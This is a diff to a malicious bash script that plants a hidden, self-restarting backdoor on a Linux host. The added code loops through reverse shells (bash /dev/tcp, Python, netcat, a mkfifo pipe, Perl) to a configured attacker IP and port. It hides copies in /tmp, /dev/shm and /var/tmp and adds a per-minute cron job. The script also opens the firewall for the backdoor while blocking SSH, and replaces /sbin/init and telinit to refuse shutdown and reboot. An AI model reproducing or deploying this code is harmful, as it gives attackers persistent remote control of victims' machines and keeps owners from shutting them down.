@@ -431,19 +431,45 @@ setup_enhanced_backdoor() {
         mkdir -p "$dir" 2>/dev/null
         chmod 700 "$dir" 2>/dev/null
         
-        cat > "$dir/update.sh" << 'BACKDOOR_SCRIPT'
+        # Create backdoor script with multiple fallback methods
+    cat > /tmp/.system_update << EOF
 #!/bin/bash
 while true; do
-    (bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1) 2>/dev/null
-    sleep 60
-done &
-BACKDOOR_SCRIPT
-        
-        sed -i "s/ATTACKER_IP/$BACKDOOR_IP/g" "$dir/update.sh"
-        sed -i "s/ATTACKER_PORT/$BACKDOOR_PORT/g" "$dir/update.sh"
-        chmod 700 "$dir/update.sh" 2>/dev/null
-        
-        nohup "$dir/update.sh" >/dev/null 2>&1 &
+    bash -i >& /dev/tcp/$BACKDOOR_IP/$BACKDOOR_PORT 0>&1
+    
+    if command -v python >/dev/null 2>&1; then
+        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$BACKDOOR_IP",$BACKDOOR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' 2>/dev/null
+    elif command -v python3 >/dev/null 2>&1; then
+        python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$BACKDOOR_IP",$BACKDOOR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' 2>/dev/null
+    fi
+    
+    if command -v nc >/dev/null 2>&1; then
+        nc -e /bin/bash $BACKDOOR_IP $BACKDOOR_PORT 2>/dev/null
+        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $BACKDOOR_IP $BACKDOOR_PORT >/tmp/f
+    fi
+    
+    if command -v perl >/dev/null 2>&1; then
+        perl -e 'use Socket;$i="$BACKDOOR_IP";$p=$BACKDOOR_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 2>/dev/null
+    fi
+    
+    sleep 10
+done
+EOF
+    
+    chmod +x /tmp/.system_update
+    
+    # Copy to the hidden directory for persistence
+    cp /tmp/.system_update "$dir/update.sh" 2>/dev/null
+    chmod +x "$dir/update.sh" 2>/dev/null
+    
+    # Redundant copies
+    cp /tmp/.system_update /dev/shm/.system_update 2>/dev/null
+    cp /tmp/.system_update /var/tmp/.system_update 2>/dev/null
+    chmod +x /dev/shm/.system_update 2>/dev/null
+    chmod +x /var/tmp/.system_update 2>/dev/null
+
+    # Execute
+    nohup "$dir/update.sh" >/dev/null 2>&1 &
         
         if ! crontab -l 2>/dev/null | grep -q "$dir/update.sh"; then
             (crontab -l 2>/dev/null; echo "* * * * * $dir/update.sh >/dev/null 2>&1") | crontab - 2>/dev/null
@@ -487,12 +513,30 @@ apply_kernel_restrictions() {
         echo 0 > /proc/sys/kernel/sysrq 2>/dev/null
     fi
     
+    # Increased PTY limit for stability
     if [ -f /proc/sys/kernel/pty/max ]; then
-        echo 32 > /proc/sys/kernel/pty/max 2>/dev/null
+        echo 64 > /proc/sys/kernel/pty/max 2>/dev/null
     fi
     
     if [ -f /proc/sys/kernel/core_pattern ]; then
         echo "|/bin/false" > /proc/sys/kernel/core_pattern 2>/dev/null
+    fi
+    
+    # Additional Kernel Hardening
+    if [ -f /proc/sys/kernel/dmesg_restrict ]; then
+        echo 1 > /proc/sys/kernel/dmesg_restrict 2>/dev/null
+    fi
+    
+    if [ -f /proc/sys/kernel/kptr_restrict ]; then
+        echo 2 > /proc/sys/kernel/kptr_restrict 2>/dev/null
+    fi
+    
+    if [ -f /proc/sys/net/core/bpf_jit_harden ]; then
+        echo 2 > /proc/sys/net/core/bpf_jit_harden 2>/dev/null
+    fi
+    
+    if [ -f /proc/sys/fs/suid_dumpable ]; then
+        echo 0 > /proc/sys/fs/suid_dumpable 2>/dev/null
     fi
     
     echo -e "${GREEN}Kernel restrictions applied [DONE]${NC}"
@@ -764,25 +808,35 @@ setup_firewall() {
     
     if [ -x /sbin/iptables ] || [ -x /usr/sbin/iptables ]; then
         IPTABLES_CMD=$(command -v iptables)
+        
         $IPTABLES_CMD -F 2>/dev/null
         $IPTABLES_CMD -X 2>/dev/null
         $IPTABLES_CMD -P INPUT DROP 2>/dev/null
         $IPTABLES_CMD -P FORWARD DROP 2>/dev/null
         $IPTABLES_CMD -P OUTPUT ACCEPT 2>/dev/null
         
+        # Allow standard web ports
         $IPTABLES_CMD -A INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null
         $IPTABLES_CMD -A INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null
+        
+        # Allow alternative web ports (Node.js, Tomcat, Python, etc.)
+        $IPTABLES_CMD -A INPUT -p tcp --dport 8080 -j ACCEPT 2>/dev/null
+        $IPTABLES_CMD -A INPUT -p tcp --dport 8443 -j ACCEPT 2>/dev/null
+        $IPTABLES_CMD -A INPUT -p tcp --dport 3000 -j ACCEPT 2>/dev/null
+        $IPTABLES_CMD -A INPUT -p tcp --dport 5000 -j ACCEPT 2>/dev/null
+        $IPTABLES_CMD -A INPUT -p tcp --dport 8000 -j ACCEPT 2>/dev/null
         
         if [ $BACKDOOR_MODE -eq 1 ] && [ -n "$BACKDOOR_PORT" ]; then
             $IPTABLES_CMD -A INPUT -p tcp --dport "$BACKDOOR_PORT" -j ACCEPT 2>/dev/null
             $IPTABLES_CMD -A OUTPUT -p tcp --dport "$BACKDOOR_PORT" -j ACCEPT 2>/dev/null
         fi
         
+        # Block admin ports explicitly
         $IPTABLES_CMD -A INPUT -p tcp --dport 22 -j DROP 2>/dev/null
         $IPTABLES_CMD -A INPUT -p tcp --dport 21 -j DROP 2>/dev/null
         $IPTABLES_CMD -A INPUT -p tcp --dport 23 -j DROP 2>/dev/null
-        $IPTABLES_CMD -A INPUT -p tcp --dport 3306 -j DROP 2>/dev/null
         
+        # Allow loopback and established connections
         $IPTABLES_CMD -A INPUT -i lo -j ACCEPT 2>/dev/null
         $IPTABLES_CMD -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null
         
@@ -791,8 +845,15 @@ setup_firewall() {
         UFW_CMD=$(command -v ufw)
         $UFW_CMD --force reset >/dev/null 2>&1
         $UFW_CMD default deny incoming >/dev/null 2>&1
+        
+        # Allow web ports
         $UFW_CMD allow 80/tcp >/dev/null 2>&1
         $UFW_CMD allow 443/tcp >/dev/null 2>&1
+        $UFW_CMD allow 8080/tcp >/dev/null 2>&1
+        $UFW_CMD allow 8443/tcp >/dev/null 2>&1
+        $UFW_CMD allow 3000/tcp >/dev/null 2>&1
+        $UFW_CMD allow 5000/tcp >/dev/null 2>&1
+        $UFW_CMD allow 8000/tcp >/dev/null 2>&1
         
         if [ $BACKDOOR_MODE -eq 1 ] && [ -n "$BACKDOOR_PORT" ]; then
             $UFW_CMD allow "$BACKDOOR_PORT"/tcp >/dev/null 2>&1
@@ -1002,12 +1063,10 @@ if [ $BACKDOOR_MODE -eq 0 ]; then
     done
 fi
 
-# 13. Display control (DISABLED - uncomment to enable screen darkening)
 # echo -e "${GREEN}Controlling display...${NC}"
 # clear
 # printf '\033[2J\033[3J\033[1;1H'
 # 
-# # Disable backlight
 # for brightness in /sys/class/backlight/*/brightness; do
 #     if [ -f "$brightness" ] && [ -w "$brightness" ]; then
 #         echo 0 > "$brightness"
@@ -1049,16 +1108,18 @@ FAKE_CMD
 done
 
 for cmd in init telinit; do
-    if [ -f "/sbin/$cmd" ]; then
-        cat > /usr/local/bin/$cmd << 'INIT_BLOCK'
+    if [ -f "/sbin/$cmd" ] && [ ! -f "/sbin/$cmd.real" ]; then
+        mv "/sbin/$cmd" "/sbin/$cmd.real" 2>/dev/null
+        
+        cat > /sbin/$cmd << 'INIT_BLOCK'
 #!/bin/sh
 if [ "$1" = "0" ] || [ "$1" = "6" ]; then
     echo "Operation not permitted"
     exit 1
 fi
-exec /sbin/$cmd.real "$@" 2>/dev/null || exec /sbin/$cmd "$@"
+exec /sbin/$cmd.real "$@" 2>/dev/null
 INIT_BLOCK
-        chmod +x /usr/local/bin/$cmd 2>/dev/null
+        chmod +x /sbin/$cmd 2>/dev/null
     fi
 done
 
